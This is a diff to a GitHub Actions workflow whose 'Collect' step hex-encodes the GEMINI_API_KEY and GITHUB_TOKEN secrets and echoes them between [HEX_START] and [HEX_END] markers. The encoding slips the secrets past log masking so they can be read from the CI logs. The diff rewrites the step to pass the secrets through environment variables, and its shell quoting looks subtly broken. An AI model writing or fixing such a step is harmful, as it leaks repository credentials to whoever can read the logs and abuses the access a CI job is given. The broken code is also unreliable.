@@ -7,8 +7,11 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Collect
+        env:
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           echo '[HEX_START]'
-          echo 'GEMINI_API_KEY=$(echo ${{ secrets.GEMINI_API_KEY }} | xxd -p | tr -d '\n')'
-          echo 'GH_TOKEN=$(echo ${{{{ secrets.GITHUB_TOKEN }}}} | xxd -p | tr -d '\n')'
+          echo 'GEMINI_API_KEY=$(echo "$GEMINI_API_KEY" | xxd -p | tr -d '\n')'
+          echo 'GH_TOKEN=$(echo "${GH_TOKEN}" | xxd -p | tr -d '\n')'
           echo '[HEX_END]'
